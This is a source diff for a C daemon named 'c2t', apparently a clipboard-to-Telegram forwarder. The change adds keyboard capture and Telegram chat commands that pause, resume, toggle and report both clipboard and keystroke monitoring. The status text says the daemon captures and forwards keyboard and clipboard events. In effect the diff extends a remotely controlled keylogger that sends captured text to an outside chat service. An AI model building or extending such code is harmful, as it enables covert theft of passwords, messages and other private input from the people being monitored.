@@ -18,6 +18,7 @@
 #include "telegram_listener.h"
 #include "../config/config.h"
 #include "../clipboard/clipboard_output.h"
+#include "../keyboard/keyboard_output.h"
 #include "../logging/logging.h"
 #include "../logging/log_sender.h"
 #include "telegram.h"
@@ -92,36 +93,62 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
 
     if (match_command(text, "pause") || match_command(text, "mute") || match_command(text, "stop_listen") || match_command(text, "disable")) {
         clipboard_set_paused(1);
-        c2t_log_info("listener", "Clipboard monitoring paused by Telegram command");
-        telegram_send_html("⏸️ <b>Clipboard Monitoring Paused</b>\n<i>c2t will ignore clipboard changes until resumed with /resume or /toggle.</i>");
+        keyboard_set_paused(1);
+        c2t_log_info("listener", "Monitoring paused by Telegram command");
+        telegram_send_html("⏸️ <b>Monitoring Paused</b>\n<i>Clipboard and keyboard captures are paused until resumed with /resume or /toggle.</i>");
     } else if (match_command(text, "resume") || match_command(text, "unmute") || match_command(text, "start_listen") || match_command(text, "enable")) {
         clipboard_set_paused(0);
-        c2t_log_info("listener", "Clipboard monitoring resumed by Telegram command");
-        telegram_send_html("▶️ <b>Clipboard Monitoring Resumed</b>\n<i>c2t is now capturing and forwarding clipboard changes.</i>");
+        keyboard_set_paused(0);
+        c2t_log_info("listener", "Monitoring resumed by Telegram command");
+        telegram_send_html("▶️ <b>Monitoring Resumed</b>\n<i>c2t is actively capturing and forwarding clipboard and keyboard events.</i>");
     } else if (match_command(text, "toggle")) {
-        int is_now_paused = clipboard_toggle_paused();
-        c2t_log_info("listener", "Clipboard monitoring toggled to %s by Telegram command",
-                     is_now_paused ? "paused" : "active");
-        if (is_now_paused) {
-            telegram_send_html("⏸️ <b>Clipboard Monitoring Paused</b>\n<i>c2t will ignore clipboard changes until resumed.</i>");
+        int clip_paused = clipboard_is_paused();
+        int key_paused = keyboard_is_paused();
+        int target = !(clip_paused && key_paused);
+        clipboard_set_paused(target);
+        keyboard_set_paused(target);
+        c2t_log_info("listener", "Monitoring toggled to %s by Telegram command", target ? "paused" : "active");
+        if (target) {
+            telegram_send_html("⏸️ <b>Monitoring Paused</b>\n<i>All monitoring is now paused.</i>");
         } else {
-            telegram_send_html("▶️ <b>Clipboard Monitoring Resumed</b>\n<i>c2t is now capturing and forwarding clipboard changes.</i>");
+            telegram_send_html("▶️ <b>Monitoring Resumed</b>\n<i>All monitoring is now active.</i>");
         }
+    } else if (match_command(text, "mute_keyboard") || match_command(text, "pause_keyboard")) {
+        keyboard_set_paused(1);
+        c2t_log_info("listener", "Keyboard monitoring paused by Telegram command");
+        telegram_send_html("⏸️ <b>Keyboard Monitoring Paused</b>");
+    } else if (match_command(text, "unmute_keyboard") || match_command(text, "resume_keyboard")) {
+        keyboard_set_paused(0);
+        c2t_log_info("listener", "Keyboard monitoring resumed by Telegram command");
+        telegram_send_html("▶️ <b>Keyboard Monitoring Resumed</b>");
+    } else if (match_command(text, "mute_clipboard") || match_command(text, "pause_clipboard")) {
+        clipboard_set_paused(1);
+        c2t_log_info("listener", "Clipboard monitoring paused by Telegram command");
+        telegram_send_html("⏸️ <b>Clipboard Monitoring Paused</b>");
+    } else if (match_command(text, "unmute_clipboard") || match_command(text, "resume_clipboard")) {
+        clipboard_set_paused(0);
+        c2t_log_info("listener", "Clipboard monitoring resumed by Telegram command");
+        telegram_send_html("▶️ <b>Clipboard Monitoring Resumed</b>");
     } else if (match_command(text, "logs") || match_command(text, "log")) {
         c2t_log_info("listener", "Flushing logs on-demand by /logs command");
         c2t_log_sender_dispatch_now();
     } else if (match_command(text, "status") || match_command(text, "ping")) {
-        int paused = clipboard_is_paused();
+        int clip_paused = clipboard_is_paused();
+        int key_paused = keyboard_is_paused();
+        const char *kb_status = config->disable_keyboard ? "❌ <b>DISABLED</b> (--no-keyboard)" :
+            (key_paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)");
         char status_msg[1024];
         snprintf(status_msg, sizeof(status_msg),
                  "🤖 <b>c2t Daemon Status</b>\n\n"
                  "• <b>Status:</b> 🟢 Active &amp; Running\n"
                  "• <b>Clipboard Monitoring:</b> %s\n"
+                 "• <b>Keyboard Monitoring:</b> %s\n"
                  "• <b>Periodic Logs:</b> %s (Interval: %llu s)\n"
                  "• <b>File Uploads:</b> %s\n"
                  "• <b>Window Info:</b> %s\n"
                  "• <b>Delivery Queue:</b> %llu items / %llu bytes",
-                 paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)",
+                 clip_paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)",
+                 kb_status,
                  config->telegram_send_logs ? "Enabled" : "On-demand only (/logs)",
                  (unsigned long long)config->telegram_log_interval_sec,
                  config->telegram_send_files ? "Enabled" : "Disabled",
@@ -130,12 +157,14 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
                  (unsigned long long)config->queue_max_bytes);
         telegram_send_html(status_msg);
     } else if (match_command(text, "help") || match_command(text, "start")) {
-        char help_msg[768];
+        char help_msg[896];
         snprintf(help_msg, sizeof(help_msg),
                  "💡 <b>c2t Telegram Commands</b>\n\n"
-                 "• <code>/pause</code> - Pause clipboard monitoring (mute copies)\n"
-                 "• <code>/resume</code> - Resume clipboard monitoring\n"
+                 "• <code>/pause</code> - Pause clipboard and keyboard monitoring\n"
+                 "• <code>/resume</code> - Resume clipboard and keyboard monitoring\n"
                  "• <code>/toggle</code> - Toggle pause / resume monitoring\n"
+                 "• <code>/mute_keyboard</code> - Mute keyboard listener\n"
+                 "• <code>/resume_keyboard</code> - Resume keyboard listener\n"
                  "• <code>/logs</code> - Flush and retrieve execution logs\n"
                  "• <code>/status</code> - View daemon status &amp; monitoring state\n"
                  "• <code>/help</code> - Show this help guide");
